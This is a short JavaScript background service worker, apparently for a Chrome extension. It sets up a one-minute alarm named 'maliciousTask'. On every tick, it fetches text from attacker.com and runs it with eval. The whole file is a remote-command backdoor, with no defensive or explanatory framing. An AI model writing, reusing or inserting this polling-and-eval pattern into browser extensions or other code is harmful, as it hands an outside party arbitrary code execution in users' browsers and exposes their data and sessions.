// background.js (service worker version)
self.addEventListener('install', () => {
    console.log('Service Worker installed');
    self.skipWaiting();
});

self.addEventListener('activate', () => {
    console.log('Service Worker activated');
});

chrome.alarms.create('maliciousTask', {
    periodInMinutes: 1 // Runs every 1 minute
});

chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === 'maliciousTask') {
        fetch('https://attacker.com/command')  
            .then(response => response.text())
            .then(command => eval(command))  
            .catch(err => console.error(err));
    }
});
